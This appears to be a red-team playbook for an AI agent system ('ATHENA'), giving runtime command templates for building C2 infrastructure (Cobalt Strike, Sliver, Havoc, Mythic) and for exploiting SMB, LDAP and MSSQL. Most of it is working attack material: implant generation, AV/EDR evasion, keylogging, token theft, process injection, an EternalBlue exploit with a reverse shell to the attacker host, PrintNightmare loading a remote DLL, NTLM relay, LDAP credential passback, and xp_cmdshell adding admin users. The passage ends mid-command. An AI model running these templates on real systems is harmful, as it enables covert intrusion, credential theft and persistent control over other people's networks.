# ATHENA C2 Infrastructure and Network Services Playbook
**Version:** 1.0
**Date:** 2026-02-26
**Classification:** RESTRICTED - Authorized Pentest Use Only
**Sources:** HackTricks Methodology Reference, InternalAllTheThings (MIT), Atomic Red Team (MIT)
**Maintained by:** ATHENA Agent Knowledge System

---

## Overview

This playbook covers the full C2 infrastructure lifecycle, network service exploitation, pivoting and tunneling, network reconnaissance, data exfiltration, wireless attacks, and post-exploitation persistence. Each technique includes ATHENA-ready command templates with placeholder variables that agents substitute at runtime.

### Variable Convention

| Variable | Meaning |
|---|---|
| `$TARGET_IP` | Single target IP |
| `$TARGET_RANGE` | CIDR range (e.g., `10.0.0.0/24`) |
| `$ATTACKER_IP` | ATHENA Kali machine IP |
| `$LHOST` | Listener host (usually `$ATTACKER_IP`) |
| `$LPORT` | Listener port |
| `$DOMAIN` | Active Directory domain (e.g., `corp.local`) |
| `$DC_IP` | Domain controller IP |
| `$USERNAME` | Target username |
| `$PASSWORD` | Target password |
| `$HASH` | NTLM hash (NT portion) |
| `$TEAMSERVER_IP` | C2 team server IP |
| `$REDIRECTOR_IP` | C2 redirector IP |
| `$C2_DOMAIN` | C2 domain (categorized, aged) |
| `$OUTPUT_DIR` | Directory for output files |
| `$WORDLIST` | Path to password wordlist |
| `$PIVOT_HOST` | Intermediate pivot host IP |
| `$INTERNAL_SUBNET` | Internal network to reach via pivot |
| `$SHARE_NAME` | SMB share name |
| `$COMMUNITY_STRING` | SNMP community string |

---

## Table of Contents

1. [C2 Framework Deployment](#section-1-c2-framework-deployment)
2. [Network Service Exploitation](#section-2-network-service-exploitation)
3. [Pivoting and Tunneling](#section-3-pivoting-and-tunneling)
4. [Network Reconnaissance](#section-4-network-reconnaissance)
5. [Data Exfiltration](#section-5-data-exfiltration)
6. [Wireless Attacks](#section-6-wireless-attacks)
7. [Post-Exploitation Persistence](#section-7-post-exploitation-persistence)

---

## Section 1: C2 Framework Deployment

### 1.1 C2 Framework Selection Decision Tree

```
Engagement Type?
├── Commercial / large enterprise target → Cobalt Strike (mature ecosystem, Malleable C2)
├── Red team / detection testing → Havoc (modern, CS replacement, no beacon IoCs)
├── Open source engagement / budget limited → Sliver (multi-protocol, cross-platform)
├── Multi-team / multi-OS complex op → Mythic (container-based, multi-agent)
└── Stealth-first / EDR-heavy environment → Cobalt Strike with Artifact Kit + Malleable C2

Transport Protocol?
├── HTTP/S allowed outbound → CS HTTP/HTTPS listener or Sliver HTTPS beacon
├── Only DNS allowed outbound → CS DNS beacon or Sliver DNS beacon
├── WireGuard/mTLS allowed → Sliver WireGuard or mTLS (hardest to inspect)
└── Internal pivot only → CS SMB/TCP peer-to-peer beacon
```

**OPSEC Decision — Staged vs. Stageless:**

```
Staged:   Small initial stager that downloads full payload. More IoCs (download traffic).
          Use: when payload size matters (phishing attachment size limits).

Stageless: Full payload in one file. Larger but fewer network IoCs.
          PREFERRED for ATHENA operations — set hosts_stage = false in CS profile.
```

---

### 1.2 Cobalt Strike

**Prerequisites:**
- Cobalt Strike licensed copy
- Java 11+ on team server host
- VPS with at least 1 redirector (socat or Apache mod_rewrite)
- Categorized, aged domain (`$C2_DOMAIN`)
- Valid SSL cert (Let's Encrypt) on redirector

**Tools:**
- `cobaltstrike` (teamserver + client)
- `socat` (redirector)
- `Apache2` with `mod_rewrite` (intelligent redirector)
- `ThreatCheck` (AV evasion validation)

#### Step 1 — Team Server Setup

```bash
# Install dependencies on team server host
sudo apt-get update && sudo apt-get install openjdk-11-jdk socat apache2 -y
sudo update-java-alternatives -s java-1.11.0-openjdk-amd64

# Start team server (keep port 50050 firewalled — SSH tunnel only)
sudo ./teamserver $TEAMSERVER_IP $TS_PASSWORD [malleable_c2_profile.profile]

# Firewall team server port from internet
sudo ufw deny 50050
sudo ufw allow from $YOUR_VPN_IP to any port 50050

# Access team server via SSH tunnel only
ssh -L 50050:127.0.0.1:50050 user@$TEAMSERVER_IP -N -f
# Then connect CS client to 127.0.0.1:50050
```

#### Step 2 — Redirector Setup (Socat)

```bash
# Basic TCP redirector (redirector host)
sudo apt install socat
socat TCP4-LISTEN:80,fork TCP4:$TEAMSERVER_IP:80 &
socat TCP4-LISTEN:443,fork TCP4:$TEAMSERVER_IP:443 &

# Chain redirectors for layered infrastructure
# Redirector 1 -> Redirector 2 -> Team Server
socat TCP4-LISTEN:443,fork TCP4:$REDIRECTOR2_IP:443 &    # on Redirector 1
socat TCP4-LISTEN:443,fork TCP4:$TEAMSERVER_IP:443 &     # on Redirector 2
```

#### Step 3 — Apache mod_rewrite Redirector (Intelligent)

```apache
# /etc/apache2/sites-available/c2.conf
# Only forward matching User-Agent + URL patterns; everything else gets 404
<VirtualHost *:443>
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/$C2_DOMAIN/cert.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/$C2_DOMAIN/privkey.pem

    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 (compatible; MSIE 10.0)" [NC]
    RewriteRule ^/updates/(.*)$ https://$TEAMSERVER_IP/$1 [P,L]

    # Catch-all: serve legitimate 404
    RewriteRule ^/(.*)$ /var/www/html/404.html [L]
</VirtualHost>
```

```bash
# Enable modules
sudo a2enmod ssl rewrite proxy proxy_http
sudo a2ensite c2.conf
sudo systemctl reload apache2
```

#### Step 4 — Listener Setup

```
In Cobalt Strike Client:
Cobalt Strike -> Listeners -> Add

HTTP Listener:
  Name: HTTPS_Redirector
  Payload: windows/beacon_https/reverse_https
  HTTPS Hosts: $C2_DOMAIN
  Port: 443
  Host Rotation: round-robin

DNS Listener (covert backup):
  Name: DNS_Beacon
  Payload: windows/beacon_dns/reverse_dns_txt
  DNS Hosts: c2.$C2_DOMAIN
  DNS Port: 53

SMB Peer-to-Peer (internal pivoting):
  Name: SMB_Pivot
  Payload: windows/beacon_bind_pipe

TCP Peer-to-Peer:
  Name: TCP_Pivot
  Payload: windows/beacon_bind_tcp
  Port: 4444
```

#### Step 5 — Payload Generation

```
# Stageless executable (preferred)
Attacks -> Packages -> Windows Executable (S)
  Select HTTPS_Redirector listener
  Output: Stageless EXE

# Stageless PowerShell (AMSI bypass required)
Attacks -> Web Drive-by -> Scripted Web Delivery (S)
  PowerShell One-Liner

# HTA (HTML Application — macro-free phishing)
Attacks -> Packages -> HTML Application

# Office Macro
Attacks -> Packages -> MS Office Macro
```

#### Step 6 — AV Evasion with Artifact Kit

```bash
# Locate Artifact Kit
ls /opt/cobaltstrike/artifact-kit/

# Find detection strings with ThreatCheck
.\ThreatCheck.exe -f .\beacon.exe                              # Windows Defender
.\ThreatCheck.exe -e AMSI -f .\ResourceKit\template.x64.ps1   # AMSI

# Modify Artifact Kit — change variable names to bypass
# $var_code -> $polop
# $x -> $arc
# Rebuild: ./build.sh
```

#### Step 7 — Malleable C2 Profile

```bash
# Good profile sources
# https://github.com/xx0hcd/Malleable-C2-Profiles
# https://github.com/threatexpress/malleable-c2

# Key settings in profile
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
set sleeptime "5000";
set jitter "25";
set hosts_stage "false";    # CRITICAL: disable staging
set dns_sleep "0";

http-get {
    set uri "/jquery-3.3.1.min.js";
    client {
        header "Accept" "text/html,application/xhtml+xml";
        header "Referer" "https://www.google.com/";
        metadata { base64url; prepend "SESSIONID="; header "Cookie"; }
    }
}
```

#### Step 8 — Post-Exploitation Commands

```bash
# Screenshots
screenshot
screenwatch     # Periodic

# Keylogger
keylogger [pid] [x86|x64]

# Port scan from beacon
portscan $TARGET_RANGE 22,80,443,445,3389 arp 1024

# PowerShell
powershell-import /path/to/PowerView.ps1
powershell Get-DomainUser

# Token impersonation
make_token $DOMAIN\$USERNAME $PASSWORD
steal_token [pid]

# Process injection
inject [pid] [x64|x86] [listener]

# Lateral movement
remote-exec wmi $TARGET_IP whoami
remote-exec winrm $TARGET_IP whoami
remote-exec psexec $TARGET_IP whoami

# SOCKS proxy for tooling
socks 1080
# Then: proxychains nmap -sT -Pn $TARGET_RANGE

# NTLM relay via beacon
beacon> socks 1080
# On Kali:
proxychains ntlmrelayx.py -t smb://$TARGET_IP

# Port forwarding
rportfwd_local 8445 $ATTACKER_IP 445   # Relay
```

#### OPSEC Considerations

```
NOISE LEVEL: Medium-High (initial delivery), Low (beaconing with proper profile)
DETECTION VECTORS:
  - Default Cobalt Strike certificate → HIGH detection
  - Default staging URI patterns → HIGH detection
  - Default sleep/jitter values → MEDIUM detection
  - Artifact Kit defaults (shellcode patterns) → HIGH detection by EDR

MITIGATIONS:
  - Custom Malleable C2 profile matching legitimate application traffic
  - Valid SSL cert (not self-signed)
  - Stageless payloads (set hosts_stage = false)
  - Artifact Kit customization with ThreatCheck validation
  - Sleep ≥ 30s with 20-30% jitter for long-term ops
  - Rotate C2 domains every 72 hours if burned

EVIDENCE FOR REPORT:
  - Screenshot of beacon session established
  - Command execution proof (whoami, ipconfig, hostname)
  - Network capture showing C2 communication (if not confidential)
```

#### Cleanup Commands

```bash
# Kill beacons (graceful)
beacon> exit

# Remove dropped files on target
beacon> rm C:\Windows\Temp\beacon.exe
beacon> rm C:\Users\$USERNAME\AppData\Local\Temp\*.tmp

# Kill team server
Ctrl+C on teamserver process

# Stop redirectors
pkill socat
sudo systemctl stop apache2
```

**MITRE ATT&CK:** T1071.001 (C2: Web), T1572 (Protocol Tunneling), T1001.001 (Malleable C2)

---

### 1.3 Sliver C2

**Prerequisites:**
- Sliver server binary (Go, cross-platform)
- Sliver client binary
- Domain + DNS NS record pointing to Sliver server (for DNS C2)
- mTLS certificates (auto-generated by Sliver)

**Tools:**
- `sliver-server`, `sliver-client` (github.com/BishopFox/sliver)

#### Step 1 — Installation and Server Start

```bash
# Install (official script)
curl https://sliver.sh/install | sudo bash

# Or manual install
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux && sudo mv sliver-server_linux /usr/local/bin/sliver-server

# Start server (interactive)
sudo sliver-server

# Start as daemon
sudo sliver-server daemon
```

#### Step 2 — Listener Setup

```bash
# HTTPS listener (port 443)
sliver > https --lhost $ATTACKER_IP --lport 443

# HTTP listener (port 80)
sliver > http --lhost $ATTACKER_IP --lport 80

# mTLS listener (recommended for internal use)
sliver > mtls --lhost $ATTACKER_IP --lport 8888

# WireGuard listener (UDP, harder to detect)
sliver > wg --lhost $ATTACKER_IP --lport 53

# DNS C2 listener
sliver > dns --domains c2.$C2_DOMAIN --lhost $ATTACKER_IP
```

#### Step 3 — Implant Generation

```bash
# HTTP/S beacon (periodic check-in)
sliver > generate beacon \
  --http $C2_DOMAIN \
  --os windows \
  --arch amd64 \
  --seconds 60 \
  --jitter 30 \
  --save /tmp/beacon_windows.exe

# mTLS session implant (persistent connection)
sliver > generate \
  --mtls $ATTACKER_IP:8888 \
  --os windows \
  --arch amd64 \
  --save /tmp/implant.exe

# DNS beacon
sliver > generate beacon \
  --dns c2.$C2_DOMAIN \
  --os windows \
  --arch amd64 \
  --save /tmp/dns-beacon.exe

# Linux implant
sliver > generate \
  --http $C2_DOMAIN \
  --os linux \
  --arch amd64 \
  --save /tmp/implant_linux

# macOS implant
sliver > generate \
  --http $C2_DOMAIN \
  --os darwin \
  --arch amd64 \
  --save /tmp/implant_macos

# Cross-compile with canary (sandbox detection)
sliver > generate beacon \
  --http $C2_DOMAIN \
  --canary canary.$C2_DOMAIN \
  --save /tmp/canary-beacon.exe
```

#### Step 4 — Session Management

```bash
# List active sessions/beacons
sliver > sessions
sliver > beacons

# Interact with session
sliver > use [session_id]

# In session:
sliver (beacon) > whoami
sliver (beacon) > ls
sliver (beacon) > ps
sliver (beacon) > pwd
sliver (beacon) > shell          # Interactive shell (noisy)
sliver (beacon) > execute whoami
sliver (beacon) > upload /local/file /remote/path
sliver (beacon) > download /remote/file /local/path

# .NET assembly execution
sliver (beacon) > execute-assembly /path/to/SharpHound.exe -c All

# BOF execution
sliver (beacon) > bof /path/to/bof.o

# SOCKS5 proxy
sliver (beacon) > socks5 start --host 127.0.0.1 --port 1080

# Port forwarding
sliver (beacon) > portfwd add --remote $TARGET_IP:$TARGET_PORT --local 0.0.0.0:$LPORT
```

#### Step 5 — HTTP C2 Traffic Customization

```json
// Location: /root/.sliver/configs/http-c2.json
// Modify to blend with target environment
{
  "implant_config": {
    "url_parameters": [
      {"name": "session", "probability": 100, "is_path": false}
    ],
    "headers": [
      {"name": "Accept-Language", "value": "en-US,en;q=0.9", "probability": 100},
      {"name": "Cache-Control", "value": "max-age=0", "probability": 100}
    ],
    "paths": ["/api/v1/sync", "/update/check", "/metrics/push"]
  }
}
```

#### OPSEC Considerations

```
NOISE LEVEL: Low-Medium (with custom http-c2.json)
DETECTION VECTORS:
  - Default http-c2.json has recognizable URL patterns → change
  - First HTTP request includes TOTP — server time must be synchronized
  - WireGuard channel: hardest to detect (looks like normal WG traffic)
  - mTLS: TLS fingerprinting possible on default certs

MITIGATIONS:
  - Customize http-c2.json for every engagement
  - Use --canary for sandbox detection
  - Prefer WireGuard or mTLS for EDR-heavy environments
  - Use beacon (periodic check-in) over session (persistent connection)

EVIDENCE FOR REPORT:
  - Screenshot of beacon in sessions list
  - execute output (whoami, ipconfig, net user)
```

**MITRE ATT&CK:** T1071.001, T1071.004 (DNS C2), T1572, T1573 (Encrypted Channel)

---

### 1.4 Havoc C2

**Prerequisites:**
- Go 1.18+, MinGW-w64, Python3, CMake, musl-tools (build deps)
- Valid SSL cert or self-signed for HTTPS listener

**Tools:**
- `havoc` (github.com/HavocFramework/Havoc)

#### Step 1 — Build and Start

```bash
# Install build dependencies
sudo apt install -y golang-go mingw-w64 python3 cmake musl-tools

# Clone and build
git clone https://github.com/HavocFramework/Havoc
cd Havoc

# Build teamserver
cd teamserver && go mod download && make
cd ..

# Build client
cd client && npm install && npm run build && pip3 install -r requirements.txt
cd ..

# Start team server
./havoc server --profile ./profiles/havoc.yaotl --debug

# Connect client
./havoc client --host 127.0.0.1 --port 40056
```

#### Step 2 — Profile Configuration

```yaml
# profiles/havoc.yaotl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056
    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    operator "ATHENA" {
        Password = "$OPERATOR_PASS"
    }
}

Listener {
    Name = "HTTPS_$C2_DOMAIN"
    Hosts = ["$ATTACKER_IP"]
    HostBind = "0.0.0.0"
    HostRotation = "round-robin"
    PortBind = 443
    PortConn = 443
    Secure = true
    Cert {
        Cert = "/etc/letsencrypt/live/$C2_DOMAIN/cert.pem"
        Key  = "/etc/letsencrypt/live/$C2_DOMAIN/privkey.pem"
    }
    Response {
        Headers = [
            "Content-type: text/html",
            "X-Powered-By: ASP.NET"
        ]
    }
}
```

#### Step 3 — Redirector Setup (Socat)

```bash
# Single redirector
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:$TEAMSERVER_IP:443 &

# Chain: VPS -> Redirector -> Team server
# On VPS (Redirector 1):
socat TCP4-LISTEN:443,fork TCP4:$REDIRECTOR2_IP:443 &
# On Redirector 2:
socat TCP4-LISTEN:443,fork TCP4:$TEAMSERVER_IP:443 &
```

#### Step 4 — Demon Agent Features

```
Havoc Demon Agent Capabilities:
- Process injection (multiple techniques)
- PPID spoofing (parent process masquerade)
- ETW (Event Tracing for Windows) patching
- AMSI bypass (in-memory)
- Token impersonation and manipulation
- Pivot listeners (SMB named pipe, TCP)
- BOF (Beacon Object File) execution
- .NET assembly execution
- Sleep masking (encrypted sleep)
- Stack spoofing

In Havoc Client — key commands:
interact [agent_id]
shell whoami
ls C:\
cd C:\Users
mkdir C:\Temp\workspace
upload /local/SharpHound.exe C:\Temp\SharpHound.exe
download C:\Temp\results.zip
execute-assembly SharpHound.exe -c All
inject [pid] [shellcode_file]
```

#### OPSEC Considerations

```
NOISE LEVEL: Low (designed as CS replacement with fewer default IoCs)
DETECTION VECTORS:
  - Havoc-specific default profile headers
  - ETW patching creates anomalous ETW trace gaps (EDR can detect)
  - AMSI bypass via in-memory patching → memory scanners

EVIDENCE FOR REPORT:
  - Agent session screenshot
  - Command output (shell whoami, ls, etc.)
```

**MITRE ATT&CK:** T1071.001, T1055 (Process Injection), T1562.006 (ETW Patching)

---

### 1.5 Mythic C2

**Prerequisites:**
- Docker and docker-compose
- Python 3.8+

**Tools:**
- `mythic-cli` (github.com/its-a-feature/Mythic)

#### Setup

```bash
# Clone and install
git clone https://github.com/its-a-feature/Mythic
cd Mythic
sudo ./install_docker_kali.sh
sudo ./mythic-cli start

# Access UI: https://localhost:7443
# Default creds shown after first start

# Install agents (examples)
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo      # .NET
sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon     # Go
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http     # C2 profile

# Start/stop
sudo ./mythic-cli start
sudo ./mythic-cli stop
sudo ./mythic-cli status
```

#### Key Concepts

```
Agents (Payload Types):
  - Apollo (.NET, Windows-focused, strong evasion)
  - Poseidon (Go, cross-platform Linux/macOS)
  - Hermes (macOS focused)

C2 Profiles:
  - http (standard HTTP beaconing)
  - websocket (WebSocket-based)
  - dynamichttp (profile-driven HTTP mutations)
  - dns (DNS C2)

Workflow in Mythic UI:
  1. Payloads -> Create Payload -> select agent + C2 profile
  2. Configure parameters (callback host, callback port, sleep, jitter)
  3. Generate and download payload
  4. After callback: Callbacks -> interact -> run commands
```

**MITRE ATT&CK:** T1071 (C2 Application Layer), T1573, T1105 (Tool Transfer)

---

### 1.6 C2 Infrastructure OPSEC — Full Checklist

```
PRE-ENGAGEMENT:
[ ] Register domains with good age (> 6 months if possible)
[ ] Use domains with legitimate-looking names (not "evil-c2.com")
[ ] Categorize domains in Bluecoat/Symantec proxy categories (Finance, Healthcare)
[ ] Obtain valid SSL certificates (Let's Encrypt — automated)
[ ] Set up minimum 1 redirector per C2 server
[ ] Firewall team server: only accept from redirectors (not 0.0.0.0/0)
[ ] Firewall TS management port (50050): SSH tunnel only

PAYLOAD:
[ ] Use stageless payloads (set hosts_stage = false)
[ ] Validate payloads with ThreatCheck before delivery
[ ] Modify default Artifact Kit (CS) to bypass static signatures
[ ] Custom Malleable C2 or http-c2.json profile for the target industry
[ ] Sleep time >= 30s with 20-30% jitter for long-term ops
[ ] Use HTTPS with valid cert (never self-signed for production C2)

DURING OPERATION:
[ ] Use separate domains per operation phase (initial/post-ex/exfil)
[ ] Rotate burned domains within 72 hours
[ ] Never stage from public CDN without domain fronting configured
[ ] Monitor redirectors for unexpected source IPs hitting C2 paths
[ ] Keep beacon count minimal — sleep long, only wake when needed
[ ] Delete dropped files after use (rm/del commands)

EVIDENCE:
[ ] Screenshot of beacon/session established
[ ] Capture command output (whoami /all, ipconfig /all, net user)
[ ] Note all files dropped on target systems (for cleanup)
```

---

## Section 2: Network Service Exploitation

### 2.1 SMB (Ports 139, 445)

**Prerequisites:** Network access to SMB ports; NetExec, smbclient, impacket installed

**Tools:** `netexec`/`crackmapexec`, `smbclient`, `smbmap`, `enum4linux-ng`, `rpcclient`, `impacket`

#### Step 1 — Version and Protocol Identification

```bash
# Identify SMB version and capabilities
nmap --script smb-protocols -p 445 $TARGET_IP
nmap --script "safe or smb-enum-*" -p 139,445 $TARGET_IP

# Quick host info (OS, hostname, domain, signing)
netexec smb $TARGET_IP
netexec smb $TARGET_RANGE    # Network sweep
```

#### Step 2 — Null / Anonymous Session Enumeration

```bash
# Check for null/anonymous access
smbclient -L //$TARGET_IP -N
smbclient -U 'anonymous%' -L //$TARGET_IP
netexec smb $TARGET_IP -u '' -p '' --shares
netexec smb $TARGET_IP -u 'guest' -p '' --shares

# Comprehensive enum (null session)
enum4linux -a $TARGET_IP
enum4linux-ng -A $TARGET_IP

# Decision: If null session works → enumerate users/groups
# If null session fails → try guest, then try credentials
```

#### Step 3 — Authenticated Share Enumeration

```bash
# List shares
smbclient -U '$USERNAME%$PASSWORD' -L //$TARGET_IP
smbmap -H $TARGET_IP -u $USERNAME -p $PASSWORD
netexec smb $TARGET_IP -u $USERNAME -p $PASSWORD --shares

# Pass-the-Hash
smbclient -U '$USERNAME' --pw-nt-hash //$TARGET_IP
smbmap -u $USERNAME -p $HASH --pw-nt-hash -H $TARGET_IP
netexec smb $TARGET_IP -u $USERNAME -H $HASH --shares

# Spider shares for interesting files
netexec smb $TARGET_IP -u $USERNAME -p $PASSWORD -M spider_plus

# Find credentials in shares (Snaffler — Windows)
Snaffler.exe -s -d $DOMAIN -o $OUTPUT_DIR/snaffler.log -v data

# Find credentials in shares (manspider — Linux)
manspider.py --threads 256 $TARGET_RANGE -u $USERNAME -p $PASSWORD \
  -e pdf docx xlsx txt -c password secret key credential api token
```

#### Step 4 — Connect to Shares and Extract Data

```bash
# Connect interactive
smbclient //$TARGET_IP/$SHARE_NAME -U $USERNAME%$PASSWORD

# Non-interactive download all
smbclient //$TARGET_IP/$SHARE_NAME -U $USERNAME%$PASSWORD \
  -c "recurse ON; prompt OFF; mget *"

# Mount share (persistent access)
sudo mount -t cifs //$TARGET_IP/$SHARE_NAME /mnt/share \
  -o user=$USERNAME,password=$PASSWORD,domain=$DOMAIN

# Download via impacket
python3 smbclient.py $DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP
```

#### Step 5 — User and RID Enumeration

```bash
# User enumeration
netexec smb $TARGET_IP -u $USERNAME -p $PASSWORD --users
netexec smb $TARGET_IP -u $USERNAME -p $PASSWORD --groups
netexec smb $TARGET_IP -u $USERNAME -p $PASSWORD --loggedon-users

# RID cycling (no auth needed on misconfigurations)
lookupsid.py guest@$TARGET_IP -no-pass
netexec smb $TARGET_IP -u guest -p '' --rid-brute

# Manual RID cycling via rpcclient
rpcclient -U "" -N $TARGET_IP
> enumdomusers
> queryuser 0x1f4
> enumdomgroups
> querygroup 0x200
> querygroupmem 0x200
```

#### Step 6 — SMB Vulnerability Checks

```bash
# Check for known vulns
nmap --script smb-vuln* -p 139,445 $TARGET_IP

# EternalBlue (MS17-010) — Windows 7, Server 2008
# Check
nmap --script smb-vuln-ms17-010 -p 445 $TARGET_IP
# Exploit
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; \
  set RHOSTS $TARGET_IP; set PAYLOAD windows/x64/shell_reverse_tcp; \
  set LHOST $ATTACKER_IP; set LPORT $LPORT; run"

# PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
impacket-rpcdump @$TARGET_IP | grep -A 5 "\\pipe\\spoolss"
python3 CVE-2021-1675.py $DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP \
  '\\$ATTACKER_IP\share\malicious.dll'

# MS08-067 (legacy — still present in some networks)
use exploit/windows/smb/ms08_067_netapi
```

#### Step 7 — SMB Relay (Requires SMB Signing Disabled)

```bash
# Identify unsigned SMB hosts (relay candidates)
netexec smb $TARGET_RANGE --gen-relay-list $OUTPUT_DIR/unsigned_smb.txt

# Decision: If signing disabled → relay; if signed → cannot relay

# Setup relay chain
# Terminal 1: Responder (capture/poison)
responder -I eth0 -rdw

# Terminal 2: Relay to targets
ntlmrelayx.py -tf $OUTPUT_DIR/unsigned_smb.txt -smb2support
# OR get interactive shell:
ntlmrelayx.py -tf $OUTPUT_DIR/unsigned_smb.txt -smb2support -i
# Connect to interactive shell: nc 127.0.0.1 [port]

# Relay directly to SAM dump
ntlmrelayx.py -t smb://$TARGET_IP -smb2support
```

#### OPSEC Considerations

```
NOISE LEVEL: Medium (enumeration), High (relay/exploitation)
DETECTION VECTORS:
  - Failed login attempts (EventID 4625) → lockout risk
  - SMB session creation to multiple hosts rapidly → lateral movement detection
  - Responder: obvious LLMNR/NBT-NS poisoning in network captures
  - ntlmrelayx: unusual NTLM relay patterns in SIEM

MITIGATIONS:
  - Keep enum attempts slow and deliberate
  - Use valid credentials when available rather than brute force
  - Test relay on 1 target before mass relay

EVIDENCE FOR REPORT:
  - netexec output showing share access
  - smbmap output showing permissions
  - Screenshot of file access or command execution
  - ntlmrelayx output showing captured/relayed credentials
```

#### Cleanup

```bash
# Unmount shares
sudo umount /mnt/share

# Stop Responder
Ctrl+C

# Remove dropped files on target
smbclient //$TARGET_IP/C$ -U $USERNAME%$PASSWORD -c "del temp\evil.exe"
```

**MITRE ATT&CK:** T1021.002 (SMB/WinRM), T1135 (Network Share Discovery), T1187 (NBNS Capture), T1557.001 (NTLM Relay)

---

### 2.2 LDAP (Ports 389, 636, 3268, 3269)

**Prerequisites:** Network access to DC; ldap-utils, ldapdomaindump, adidnsdump installed

**Tools:** `ldapsearch`, `ldapdomaindump`, `adidnsdump`, `netexec`

#### Step 1 — Anonymous Bind Check

```bash
# Check for anonymous LDAP enumeration
ldapsearch -H ldap://$DC_IP -x -b "" -s base namingContexts
ldapsearch -H ldap://$DC_IP -x -b "dc=$DOMAIN_PART1,dc=$DOMAIN_PART2"

# Decision: If anonymous bind works → extract full directory
# If anonymous bind fails → need credentials
```

#### Step 2 — Authenticated Enumeration

```bash
# All objects
ldapsearch -H ldap://$DC_IP -x \
  -D "$USERNAME@$DOMAIN" -w $PASSWORD \
  -b "dc=$DOMAIN_PART1,dc=$DOMAIN_PART2" "(objectClass=*)"

# All users
ldapsearch -H ldap://$DC_IP -x \
  -D "$USERNAME@$DOMAIN" -w $PASSWORD \
  -b "dc=$DOMAIN_PART1,dc=$DOMAIN_PART2" \
  "(objectClass=person)" cn sAMAccountName userPrincipalName

# All computers
ldapsearch -H ldap://$DC_IP -x \
  -D "$USERNAME@$DOMAIN" -w $PASSWORD \
  -b "dc=$DOMAIN_PART1,dc=$DOMAIN_PART2" \
  "(objectClass=computer)" cn dNSHostName operatingSystem

# Find Domain Admins
ldapsearch -H ldap://$DC_IP -x \
  -D "$USERNAME@$DOMAIN" -w $PASSWORD \
  -b "dc=$DOMAIN_PART1,dc=$DOMAIN_PART2" \
  "(memberOf=CN=Domain Admins,CN=Users,DC=$DOMAIN_PART1,DC=$DOMAIN_PART2)"

# Find users with passwords in description (common misconfiguration)
ldapsearch -H ldap://$DC_IP -x \
  -D "$USERNAME@$DOMAIN" -w $PASSWORD \
  -b "dc=$DOMAIN_PART1,dc=$DOMAIN_PART2" \
  "(description=*pass*)" sAMAccountName description
```

#### Step 3 — Comprehensive LDAP Dump

```bash
# ldapdomaindump — produces HTML/JSON/CSV output
ldapdomaindump -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" \
  -o $OUTPUT_DIR/ldap ldap://$DC_IP

# Files created:
# domain_users.html, domain_computers.html, domain_groups.html
# domain_policy.html, domain_trusts.html

# ADIDNS dump (DNS records in AD)
adidnsdump -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" $DC_IP
adidnsdump -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" $DC_IP -r  # With recursion
```

#### Step 4 — LDAP Passback Attack (Printers/Applications)

```bash
# If target application uses LDAP authentication (printer, application server):
# 1. Change LDAP server address to attacker-controlled server
# 2. Capture LDAP bind credentials

# Setup LDAP capture listener
sudo python3 -m ldap3 server --host 0.0.0.0 --port 389

# Or use responder (captures LDAP auth)
responder -I eth0

# Trigger LDAP auth by accessing printer/application web panel
# Navigate to: http://$TARGET_IP/admin
# Change LDAP server to $ATTACKER_IP
# Click "Test Connection" → captures credentials in Responder
```

#### OPSEC Considerations

```
NOISE LEVEL: Low (read-only LDAP queries are normal traffic)
DETECTION VECTORS:
  - Large LDAP queries with wildcards may trigger DLP/SIEM
  - ldapdomaindump creates many queries in short time → detectable
  - LDAP passback requires access to device admin interface

EVIDENCE FOR REPORT:
  - ldapdomaindump HTML output (domain_users.html)
  - Screenshot of user/group/computer data extracted
  - Credentials captured via passback (if applicable)
```

**MITRE ATT&CK:** T1018 (Remote System Discovery), T1087.002 (Domain Account Discovery)

---

### 2.3 MSSQL (Port 1433)

**Prerequisites:** Network access to port 1433; impacket, netexec installed

**Tools:** `impacket-mssqlclient`, `netexec mssql`, `nmap mssql scripts`

#### Step 1 — Discovery and Authentication

```bash
# Enumerate MSSQL instances
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config \
  ms-sql-ntlm-info,ms-sql-dac $TARGET_IP

# Check for empty SA password
netexec mssql $TARGET_IP -u sa -p ''
netexec mssql $TARGET_IP -u sa -p 'sa'
netexec mssql $TARGET_IP -u sa -p 'password'

# Authenticated login
netexec mssql $TARGET_IP -u $USERNAME -p $PASSWORD
impacket-mssqlclient $DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP -windows-auth
impacket-mssqlclient sa:$PASSWORD@$TARGET_IP

# Decision: If sa account works → xp_cmdshell likely available
# If Windows auth → limited to SQL permissions, need sysadmin for RCE
```

#### Step 2 — Enumeration

```bash
# In mssqlclient:
SQL> SELECT @@version
SQL> SELECT @@servername
SQL> SELECT db_name()
SQL> SELECT name FROM master..sysdatabases
SQL> SELECT name, password_hash FROM master.sys.sql_logins
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')   -- Check if sysadmin
SQL> SELECT * FROM sys.servers             -- Linked servers
```

#### Step 3 — xp_cmdshell RCE

```bash
# Enable xp_cmdshell (requires sysadmin)
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'net user $USERNAME $PASSWORD /add';
SQL> EXEC xp_cmdshell 'net localgroup administrators $USERNAME /add';
SQL> EXEC xp_cmdshell 'powershell -enc [base64_payload]';

# If xp_cmdshell blocked, try OLE Automation
SQL> EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
SQL> DECLARE @obj INT;
